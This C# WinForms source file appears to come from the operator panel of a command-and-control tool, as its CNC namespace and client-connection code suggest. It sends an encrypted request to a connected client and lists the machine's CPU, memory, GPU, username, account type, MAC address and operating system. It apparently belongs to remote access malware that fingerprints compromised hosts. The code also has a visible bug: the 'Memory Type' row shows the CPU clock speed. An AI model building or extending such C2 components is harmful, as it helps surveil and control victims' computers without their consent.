using CNC.Core.Data;
using CNC.Core.Security;
using Newtonsoft.Json;
using Shared.Objects;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace CNC.Forms
{
    public partial class SysInfo : Form
    {
        Client currentClient;
        public SysInfo(Client client)
        {
            InitializeComponent();
            currentClient = client;
            GetSystemInfo();
        }

        public void GetSystemInfo()
        {
            infoListView.Items.Clear();
            SystemInfo systemInfo = JsonConvert.DeserializeObject<SystemInfo>(Cryptography.Decrypt(
                currentClient.Connection.SendReceiveObject<string, string>("GetSystemInfoReq", "GetSystemInfoRep", 20000, 
                Cryptography.Encrypt(Guid.NewGuid().ToString()))));

            infoListView.Items.Add(new ListViewItem(new string[] {
                "CPU:", systemInfo.CPUName
            }));
            infoListView.Items.Add(new ListViewItem(new string[] {
                "CPU Clockspeed:", systemInfo.CPUClockSpeed
            }));
            infoListView.Items.Add(new ListViewItem(new string[] {
                "CPU Manufacturer:", systemInfo.CPUManufacturer
            }));
            infoListView.Items.Add(new ListViewItem(new string[] {
                "Memory Capacity:", systemInfo.MemoryCapacity
            }));
            infoListView.Items.Add(new ListViewItem(new string[] {
                "Memory Type:", systemInfo.CPUClockSpeed
            }));
            infoListView.Items.Add(new ListViewItem(new string[] {
                "Memory Manufacturer:", systemInfo.MemoryManufacturer
            }));
            infoListView.Items.Add(new ListViewItem(new string[] {
                "Memory Name:", systemInfo.MemoryName
            }));
            infoListView.Items.Add(new ListViewItem(new string[] {
                "GPU:", systemInfo.GPUName
            }));
            infoListView.Items.Add(new ListViewItem(new string[] {
                "GPU MemoryType:", systemInfo.GPUMemoryType
            }));
            infoListView.Items.Add(new ListViewItem(new string[] {
                "Username:", systemInfo.Username
            }));
            infoListView.Items.Add(new ListViewItem(new string[] {
                "Account Type:", systemInfo.AccountType
            }));
            infoListView.Items.Add(new ListViewItem(new string[] {
                "MAC Address:", systemInfo.MACAddress
            }));
            infoListView.Items.Add(new ListViewItem(new string[] {
                "Operating System:", systemInfo.OperatingSystem
            }));
        }
    }
}
